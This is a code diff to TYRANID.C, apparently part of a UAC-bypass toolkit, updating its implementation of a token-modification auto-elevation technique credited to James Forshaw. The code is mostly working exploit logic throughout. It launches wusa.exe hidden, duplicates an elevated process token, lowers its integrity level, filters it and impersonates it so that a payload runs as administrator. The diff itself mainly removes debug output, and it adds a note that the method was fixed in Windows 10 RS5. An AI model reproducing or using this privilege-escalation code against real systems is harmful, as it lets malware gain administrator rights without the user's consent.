@@ -4,9 +4,9 @@
 *
 *  TITLE:       TYRANID.C
 *
-*  VERSION:     2.87
+*  VERSION:     3.00
 *
-*  DATE:        02 Mar 2018
+*  DATE:        25 Aug 2018
 *
 *  James Forshaw autoelevation method(s)
 *  Fine Dinning Tool (c) CIA
@@ -82,13 +82,15 @@ BOOL ucmDiskCleanupEnvironmentVariable(
 *
 * Obtains the token from an auto-elevated process, modifies it, and reuses it to execute as administrator.
 *
+* Fixed in Windows 10 RS5
+*
 */
 BOOL ucmTokenModification(
     _In_ LPWSTR lpszPayload,
     _In_ BOOL fUseCommandLine
 )
 {
-    BOOL bCond = FALSE, bFound = FALSE, bResult = FALSE, bSelfRun = FALSE;
+    BOOL bCond = FALSE, bResult = FALSE, bSelfRun = FALSE;
     ULONG dummy;
     NTSTATUS Status = STATUS_UNSUCCESSFUL;
     HANDLE hTargetProcess = NULL;
@@ -143,7 +145,6 @@ BOOL ucmTokenModification(
                             // Elevated process found, don't close it handles as we will re-use them next.
                             //
                             if (tei.TokenIsElevated > 0) {
-                                bFound = TRUE;
                                 break;
                             }
                         }
@@ -153,16 +154,17 @@ BOOL ucmTokenModification(
                     NtClose(hTargetProcess);
                     hTargetProcess = NULL;
                 }
-                if (pList->NextEntryDelta == 0) {
+
+                if (pList->NextEntryDelta == 0)
                     break;
-                }
+
                 pList = (PSYSTEM_PROCESSES_INFORMATION)(((LPBYTE)pList) + pList->NextEntryDelta);
             }
             supHeapFree(ProcessList);
         }
 
         //
-        // If not found then run it youself.
+        // If not found then run it.
         //
         if (hTargetProcess == NULL) {
 
@@ -174,11 +176,6 @@ BOOL ucmTokenModification(
             shinfo.lpFile = WUSA_EXE;
             shinfo.nShow = SW_HIDE;
             if (!ShellExecuteEx(&shinfo)) {
-#ifdef _INT_DEBUG
-                supDebugPrint(
-                    TEXT("ucmTokenModification->ShellExecute"),
-                    GetLastError());
-#endif
                 break;
             }
             else {
@@ -192,14 +189,8 @@ BOOL ucmTokenModification(
         //
         if (hProcessToken == NULL) {
             Status = NtOpenProcessToken(hTargetProcess, MAXIMUM_ALLOWED, &hProcessToken);
-            if (!NT_SUCCESS(Status)) {
-#ifdef _INT_DEBUG
-                supDebugPrint(
-                    TEXT("ucmTokenModification->NtOpenProcessToken"),
-                    Status);
-#endif
+            if (!NT_SUCCESS(Status))
                 break;
-            }
         }
 
         //
@@ -212,14 +203,8 @@ BOOL ucmTokenModification(
         InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
         obja.SecurityQualityOfService = &sqos;
         Status = NtDuplicateToken(hProcessToken, TOKEN_ALL_ACCESS, &obja, FALSE, TokenPrimary, &hDupToken);
-        if (!NT_SUCCESS(Status)) {
-#ifdef _INT_DEBUG
-            supDebugPrint(
-                TEXT("ucmTokenModification->NtDuplicateToken"),
-                Status);
-#endif
+        if (!NT_SUCCESS(Status))
             break;
-        }
 
         //
         // Lower duplicated token IL from High to Medium.
@@ -228,41 +213,23 @@ BOOL ucmTokenModification(
             1, SECURITY_MANDATORY_MEDIUM_RID,
             0, 0, 0, 0, 0, 0, 0,
             &pIntegritySid);
-        if (!NT_SUCCESS(Status)) {
-#ifdef _INT_DEBUG
-            supDebugPrint(
-                TEXT("ucmTokenModification->RtlAllocateAndInitializeSid"),
-                Status);
-#endif
+        if (!NT_SUCCESS(Status))
             break;
-        }
 
         tml.Label.Attributes = SE_GROUP_INTEGRITY;
         tml.Label.Sid = pIntegritySid;
 
         Status = NtSetInformationToken(hDupToken, TokenIntegrityLevel, &tml,
             (ULONG)(sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid)));
-        if (!NT_SUCCESS(Status)) {
-#ifdef _INT_DEBUG
-            supDebugPrint(
-                TEXT("ucmTokenModification->NtSetInformationToken"),
-                Status);
-#endif
+        if (!NT_SUCCESS(Status))
             break;
-        }
 
         //
         // Create restricted token.
         //
         Status = NtFilterToken(hDupToken, LUA_TOKEN, NULL, NULL, NULL, &hLuaToken);
-        if (!NT_SUCCESS(Status)) {
-#ifdef _INT_DEBUG
-            supDebugPrint(
-                TEXT("ucmTokenModification->NtFilterToken"),
-                Status);
-#endif
+        if (!NT_SUCCESS(Status))
             break;
-        }
 
         //
         // Impersonate logged on user.
@@ -273,14 +240,8 @@ BOOL ucmTokenModification(
             FALSE,
             TokenImpersonation,
             &hImpToken);
-        if (!NT_SUCCESS(Status)) {
-#ifdef _INT_DEBUG
-            supDebugPrint(
-                TEXT("ucmTokenModification->NtDuplicateToken2"),
-                Status);
-#endif
+        if (!NT_SUCCESS(Status))
             break;
-        }
 
         Status = NtSetInformationThread(
             NtCurrentThread(),
@@ -288,14 +249,8 @@ BOOL ucmTokenModification(
             &hImpToken,
             sizeof(HANDLE));
 
-        if (!NT_SUCCESS(Status)) {
-#ifdef _INT_DEBUG
-            supDebugPrint(
-                TEXT("ucmTokenModification->NtSetInformationThread"),
-                Status);
-#endif
+        if (!NT_SUCCESS(Status))
             break;
-        }
 
         NtClose(hImpToken);
         hImpToken = NULL;
@@ -345,13 +300,6 @@ BOOL ucmTokenModification(
             ThreadImpersonationToken,
             (PVOID)&hImpToken,
             sizeof(HANDLE));
-        if (!NT_SUCCESS(Status)) {
-#ifdef _INT_DEBUG
-            supDebugPrint(
-                TEXT("ucmTokenModification->NtSetInformationThread2"),
-                Status);
-#endif
-        }
 
     } while (bCond);
 
